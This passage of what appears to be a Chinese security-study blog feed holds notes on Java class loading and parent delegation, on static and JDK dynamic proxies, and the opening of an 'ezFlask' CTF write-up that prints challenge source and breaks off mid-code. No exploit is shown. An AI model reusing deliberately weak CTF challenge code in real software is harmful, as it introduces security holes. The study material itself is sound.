将类的.class文件加载到jvm中之外，还会对类进行解释，执行类中的static块 –&gt; Class.forName(name, initialize, loader)<strong>带参函数也可控制是否加载static块</strong>。并且只有调用了newInstance()方法采用调用构造函数，创建类的对象</li><li>ClassLoader.loadClass(): 只干一件事情，就是将.class文件加载到jvm中，<strong>不会执行static中的内容</strong>,只有在newInstance才会去执行static块。</li></ol></li></ol><h3 id="加载宏观理解"><a href="#加载宏观理解" class="headerlink" title="加载宏观理解"></a>加载宏观理解</h3><ol><li><em><strong>全局上加载干了3件事</strong></em><ol><li>通过一个类的全限定名来获取其定义的二进制字节流。</li><li>将这个字节流所代表的静态存储结构转化为方法区的运行时数据结构。</li><li>在Java堆中生成一个代表这个类的java.lang.Class对象，作为对方法区中这些数据的访问入口</li><li><img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/java%E5%8A%A0%E8%BD%BD%E5%AE%8F%E8%A7%82.png" alt="宏观加载"></li></ol></li></ol><h3 id="加载流程"><a href="#加载流程" class="headerlink" title="加载流程"></a>加载流程</h3><ol><li><p>源码部分详见<a href="https://www.javasec.org/javase/ClassLoader/#classloader%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B">这个段落</a></p><ol><li>下面是jdk1.7u21中的实现</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; loadClass(String name, <span class="type">boolean</span> resolve)</span><br><span class="line">     <span class="keyword">throws</span> ClassNotFoundException</span><br><span class="line"> &#123;</span><br><span class="line">     <span class="keyword">synchronized</span> (getClassLoadingLock(name)) &#123;</span><br><span class="line">         <span class="comment">// First, check if the class has already been loaded</span></span><br><span class="line">         <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> findLoadedClass(name);</span><br><span class="line">         <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">             <span class="type">long</span> <span class="variable">t0</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">                 <span class="keyword">if</span> (parent != <span class="literal">null</span>) &#123;</span><br><span class="line">                     c = parent.loadClass(name, <span class="literal">false</span>);</span><br><span class="line">                 &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                     c = findBootstrapClassOrNull(name);</span><br><span class="line">                 &#125;</span><br><span class="line">             &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                 <span class="comment">// ClassNotFoundException thrown if class not found</span></span><br><span class="line">                 <span class="comment">// from the non-null parent class loader</span></span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (c == <span class="literal">null</span>) &#123;</span><br><span class="line">                 <span class="comment">// If still not found, then invoke findClass in order</span></span><br><span class="line">                 <span class="comment">// to find the class.</span></span><br><span class="line">                 <span class="type">long</span> <span class="variable">t1</span> <span class="operator">=</span> System.nanoTime();</span><br><span class="line">                 c = findClass(name);</span><br><span class="line"></span><br><span class="line">                 <span class="comment">// this is the defining class loader; record the stats</span></span><br><span class="line">                 sun.misc.PerfCounter.getParentDelegationTime().addTime(t1 - t0);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);</span><br><span class="line">                 sun.misc.PerfCounter.getFindClasses().increment();</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">if</span> (resolve) &#123;</span><br><span class="line">             resolveClass(c);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> c;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>类加载器并不需要等到某个类被“首次主动使用”时再加载它，而是允许进行预料</strong>，JVM规范允许类加载器在预料某个类将要被使用时就预先加载它 –&gt; <strong>但是用到有问题才会报道</strong>: 如果在预先加载的过程中遇到了.class文件缺失或存在错误，类加载器必须在程序首次主动使用该类时才报告错误(LinkageError错误)如果这个类一直没有被程序主动使用，那么类加载器就不会报告错误。</p></li><li><p><strong>简要说明以下，以缩进作为顺序的层次</strong></p><ol><li><code>loadClass()</code>检查是否已经加载过<ol><li>如果没有找到，检查parent，以下步骤一直递归进行<ol><li>parent!&#x3D;null，调用parent的loadClass</li><li>parent&#x3D;&#x3D;null，调用Bootstrap ClassLoader</li></ol></li><li>如果找到也继续往下走</li><li>判断是否找到<ol><li>如果没有找到，调用<code>findClass()</code>，默认没有重写，直接返回类加载失败异常，如果有重写，一般会findClass()内部再实现<code>defineClass()</code></li><li>如果找到了继续</li></ol></li><li>判断是否有<code>resolve</code>如果调用loadClass的时候传入的resolve参数为true，那么还需要调用resolveClass方法链接类，默认为false</li></ol></li></ol></li></ol><h3 id="双亲委托模型"><a href="#双亲委托模型" class="headerlink" title="双亲委托模型"></a>双亲委托模型</h3><blockquote><p>源码的话见上述的“加载流程”中有</p></blockquote><ol><li><p><strong>双亲委托模型</strong>：这一模型的核心思想是——当一个类加载器接收到类加载请求时，它首先不会自己尝试加载这个类，而是<strong>优先将这个请求委派给它的父类加载器去处理</strong>。只有当父类加载器无法加载该类时，当前类加载器才会尝试自己去加载</p><ol><li><p>有张图就是好理解<img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/%E5%8F%8C%E4%BA%B2%E5%A7%94%E6%B4%BE%E6%A8%A1%E5%9E%8B.png" alt="pic"></p></li><li><p><strong>非强制性</strong>: 双亲委派模型并不是一种强制性的约束，只是 JDK 官方推荐的一种方式。如果我们因为某些特殊需求想要打破双亲委派模型，也是可以的</p></li><li><p><strong>组合代替继承</strong>: 类加载器之间的父子关系一般不是以继承的关系来实现的，而是通常使用组合关系来复用父加载器的代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="comment">// 组合</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader parent;</span><br><span class="line">  <span class="keyword">protected</span> <span class="title function_">ClassLoader</span><span class="params">(ClassLoader parent)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>(checkCreateClassLoader(), parent);</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li><li><p>双亲委派机制过程？ –&gt; <strong>继承链自顶向下</strong>，先向上交再向下找</p><ol><li>当AppClassLoader加载一个class时，它首先不会自己去尝试加载这个类，而是把类加载请求委派给父类加载器ExtClassLoader去完成。</li><li>当ExtClassLoader加载一个class时，它首先也不会自己去尝试加载这个类，而是把类加载请求委派给BootStrapClassLoader去完成。</li><li>如果BootStrapClassLoader加载失败(例如在$JAVA_HOME&#x2F;jre&#x2F;lib里未查找到该class)，会使用ExtClassLoader来尝试加载；</li><li>若ExtClassLoader也加载失败，则会使用AppClassLoader来加载</li><li>如果AppClassLoader也加载失败，则会报出异常ClassNotFoundException。</li></ol></li><li><p><strong>目的</strong>：系统类防止内存中出现多份同样的字节码</p><ol><li>Q: 那是怎么做到的呢？结合jvm的类加载隔离进行理解<ol><li>A: 例子：比如我们编写一个称为 java.lang.Object 类的话，那么程序运行的时候，系统就会出现两个不同的 Object 类。双亲委派模型可以保证加载的是 JRE 里的那个 Object 类，而不是你写的 Object 类。这是因为 AppClassLoader 在加载你的 Object 类时，会委托给 ExtClassLoader 去加载，而 ExtClassLoader 又会委托给 BootstrapClassLoader，BootstrapClassLoader 发现自己已经加载过了 Object 类，会直接返回，不会去加载你写的 Object 类</li></ol></li></ol></li></ol><h2 id="类的加载隔离"><a href="#类的加载隔离" class="headerlink" title="类的加载隔离"></a>类的加载隔离</h2><h3 id="基本原则"><a href="#基本原则" class="headerlink" title="基本原则"></a>基本原则</h3><blockquote><p>Q: JVM如何判定两个Java类是否相同的?<br>A: JVM不仅要看类的<em><strong>全名</strong></em>是否相同，还要看<em><strong>加载此类的类加载器</strong></em>是否一样。只有两者都相同的情况，才认为两个类是相同的。即使两个类来源于同一个 Class 文件，被同一个虚拟机加载，只要加载它们的类加载器不同，那这两个类就必定不相同</p></blockquote><ol><li>创建类加载器的时候可以指定该类加载的父类加载器，ClassLoader是有隔离机制的，不同的ClassLoader可以加载相同的Class（两者必须是非继承关系），同级ClassLoader跨类加载器调用方法时必须使用反射。<ol><li>jvm类隔离机制<img src="/pic/Java%E5%AE%89%E5%85%A83(1)_%E7%B1%BB%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/jvm%E7%B1%BB%E9%9A%94%E7%A6%BB%E6%9C%BA%E5%88%B6.png" alt="jvm类隔离机制"></li></ol></li><li><em><strong>基本原则</strong></em>: 跨类加载器调用类方法时需要特别注意一个基本原则：ClassLoader A和ClassLoader B可以加载相同类名的类，但是ClassLoader A中的Class A和ClassLoader B中的Class A是完全不同的对象，两者之间调用只能通过反射</li></ol><h3 id="安全检测"><a href="#安全检测" class="headerlink" title="安全检测"></a>安全检测</h3><ol><li>RASP和IAST经常会用到跨类加载器加载类的情况，因为RASP&#x2F;IAST会在任意可能存在安全风险的类中插入检测代码，因此必须得保证RASP&#x2F;IAST的类能够被插入的类所使用的类加载正确加载，否则就会出现ClassNotFoundException</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li>javasec</li><li><a href="https://javaguide.cn/java/jvm/classloader.html">java guide</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java安全2_jdk代理</title>
      <link href="/2024/11/13/Java%E5%AE%89%E5%85%A82_jdk%E4%BB%A3%E7%90%86/"/>
      <url>/2024/11/13/Java%E5%AE%89%E5%85%A82_jdk%E4%BB%A3%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><blockquote><p><strong>java中代理的作用</strong>: 在不修改原目标对象的前提下，提供额外的功能操作，扩展目标对象的功能<br>其实可以类似理解为python中装饰器，但是java是针对某一个类的全体对象的</p></blockquote><h2 id="先说Java静态代理"><a href="#先说Java静态代理" class="headerlink" title="先说Java静态代理"></a>先说Java静态代理</h2><ol><li>要求: 静态代理中，我们对目标对象的每个方法的增强都是手动完成的（后面会具体演示代码）</li><li><strong>局限性</strong>: 非常不灵活（比如接口一旦新增加方法，目标对象和代理对象都要进行修改）且麻烦（需要对每个目标类都单独写一个代理类） –&gt; <strong>从 JVM 层面来说， 静态代理在编译时就将接口、实现类、代理类这些都变成了一个个实际的 class 文件</strong></li><li>实现步骤<ol><li>静态代理实现步骤:定义一个接口及其实现类；</li><li>创建一个代理类同样实现这个接口<strong>将目标对象注入进代理类</strong>，然后在代理类的对应方法调用目标类中的对应方法。</li><li>这样的话，我们就可以通过代理类屏蔽对目标对象的访问，并且可以在目标方法执行前后做一些自己想做的事情。</li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Main.java</span></span><br><span class="line"><span class="keyword">package</span> StaticProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SmsService</span>();</span><br><span class="line">        <span class="type">ProxySmsService</span> <span class="variable">smsProxy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProxySmsService</span>(smsService);</span><br><span class="line">        smsProxy.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ISmsService</span></span><br><span class="line"><span class="keyword">package</span> StaticProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ISmsService</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SmsService</span></span><br><span class="line"><span class="keyword">package</span> StaticProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SmsService</span> <span class="keyword">implements</span> <span class="title class_">ISmsService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello SmsServie&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ProxySmsService</span></span><br><span class="line"><span class="keyword">package</span> StaticProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProxySmsService</span> <span class="keyword">implements</span> <span class="title class_">ISmsService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SmsService proxyedObj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ProxySmsService</span><span class="params">(SmsService obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.proxyedObj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello ProxySmsService&quot;</span>);</span><br><span class="line">        proxyedObj.send();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="再说jdk动态代理"><a href="#再说jdk动态代理" class="headerlink" title="再说jdk动态代理"></a>再说jdk动态代理</h2><h3 id="使用机制与步骤"><a href="#使用机制与步骤" class="headerlink" title="使用机制与步骤"></a>使用机制与步骤</h3><ol><li>步骤<ol><li>定义一个接口及其实现类；</li><li>自定义 InvocationHandler 并重写invoke方法，在 invoke 方法中我们会调用原生方法（被代理类的方法）并自定义一些处理逻辑；</li><li>通过 Proxy.newProxyInstance(ClassLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) 方法创建代理对象；</li><li>接下来通过代理对象就可以调用经过增强的方法</li></ol></li><li>理解<ol><li>Proxy类用来创建动态代理</li><li>InvocationHandler用来处理函数调用 -&gt; <strong>。 当我们的动态代理对象调用一个方法时，这个方法的调用就会被转发到实现InvocationHandler 接口类的 invoke 方法来调用</strong></li></ol></li><li><strong>Proxy</strong><ol><li><p>关键方法</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span><br><span class="line"><span class="params">                                          Class&lt;?&gt;[] interfaces,</span></span><br><span class="line"><span class="params">                                          InvocationHandler h)</span></span><br><span class="line">        <span class="keyword">throws</span> IllegalArgumentException</span><br><span class="line">    &#123;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 必须需要实现InvocationHandler 来自定义处理逻辑</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 当你使用代理对象调用方法的时候实际会调用到这个方法</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span></span><br><span class="line">        <span class="keyword">throws</span> Throwable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="动态代理实现示例"><a href="#动态代理实现示例" class="headerlink" title="动态代理实现示例"></a>动态代理实现示例</h3><ol><li>注意事项<ol><li><p>动态代理和静态代理一样是以<strong>对象为单位的</strong></p><ol><li>对象注入，但是没有限制哪种类型的对象可以注入，就都可以</li><li>但是<code>invoke()</code>中对不同对象的方法调用处理并不是对所有类型的对象都可以的</li></ol></li><li><p><em><strong>关于<code>Proxy.newInstance</code>的参数</strong></em></p><ol><li>lassLoader loader:描述: 类加载器。这个参数指定了用来加载代理类的类加载器 –&gt; 一般是加载接口类的加载器</li><li>Class&lt;?&gt;[] interfaces:描述: 代理类需要实现的接口数组</li><li><code>target.getClass().getClassLoader()</code>和<code>target.getClass().getInterfaces()</code>，也是利用到了反射</li></ol>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一个通用的调用方法，这里虽然使用了工厂模式，但是不是该模式也可以</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdkProxyFactory</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProxy</span><span class="params">(Object target)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Proxy.newProxyInstance(</span><br><span class="line">                target.getClass().getClassLoader(), <span class="comment">// 目标类的类加载器</span></span><br><span class="line">                target.getClass().getInterfaces(),  <span class="comment">// 代理需要实现的接口，可指定多个</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">DebugInvocationHandler</span>(target)   <span class="comment">// 代理对象对应的自定义 InvocationHandler</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 工厂模式下的实际使用</span></span><br><span class="line"><span class="type">SmsService</span> <span class="variable">smsService</span> <span class="operator">=</span> (SmsService) JdkProxyFactory.getProxy(<span class="keyword">new</span> <span class="title class_">SmsServiceImpl</span>());</span><br><span class="line">smsService.send(<span class="string">&quot;java&quot;</span>);</span><br></pre></td></tr></table></figure></li><li><p>在<code>invoke()</code>函数中，可以通过<strong>反射来对调用的不同函数进行处理</strong></p></li></ol></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ITest</span></span><br><span class="line"><span class="keyword">package</span> DynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">ITest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Test</span></span><br><span class="line"><span class="keyword">package</span> DynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> <span class="keyword">implements</span> <span class="title class_">ITest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hello Test&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TestInvocationHandler</span></span><br><span class="line"><span class="keyword">package</span> DynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestInvocationHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span> &#123;</span><br><span class="line">    <span class="comment">// 实现对象注入</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object myObj;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TestInvocationHandler</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.myObj = obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> InvocationTargetException, IllegalAccessException &#123;</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (method.getName().equals(<span class="string">&quot;test&quot;</span>))  &#123;</span><br><span class="line">            <span class="comment">// 调用前添加自己的操作</span></span><br><span class="line">            System.out.println(<span class="string">&quot;welcome to invoke&quot;</span>);</span><br><span class="line">            method.invoke(<span class="built_in">this</span>.myObj, args);</span><br><span class="line">            <span class="comment">// 调用后调用自己的操作</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Main</span></span><br><span class="line"><span class="keyword">package</span> DynamicProxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">ITest</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">        <span class="type">ITest</span> <span class="variable">myObj</span> <span class="operator">=</span> (ITest) Proxy.newProxyInstance(ITest.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>&lt;?&gt;[]&#123;ITest.class&#125;, <span class="keyword">new</span> <span class="title class_">TestInvocationHandler</span>(test));</span><br><span class="line">        myObj.test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="jdk动态代理局限性"><a href="#jdk动态代理局限性" class="headerlink" title="jdk动态代理局限性"></a>jdk动态代理局限性</h3><ol><li>比如它只能代理实现了接口的类。如果需要代理没有接口的类，则需要使用像 CGLIB 这样的第三方库</li></ol><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ol><li><a href="https://javaguide.cn/java/basis/proxy.html#_3-1-jdk-%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6">javaguide</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ezFlask_DASCTF23</title>
      <link href="/2024/11/12/ezFlask_DASCTF23/"/>
      <url>/2024/11/12/ezFlask_DASCTF23/</url>
      
        <content type="html"><![CDATA[<h2 id="分析-DONE"><a href="#分析-DONE" class="headerlink" title="分析(DONE)"></a>分析(DONE)</h2><ol><li><p>源码</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> 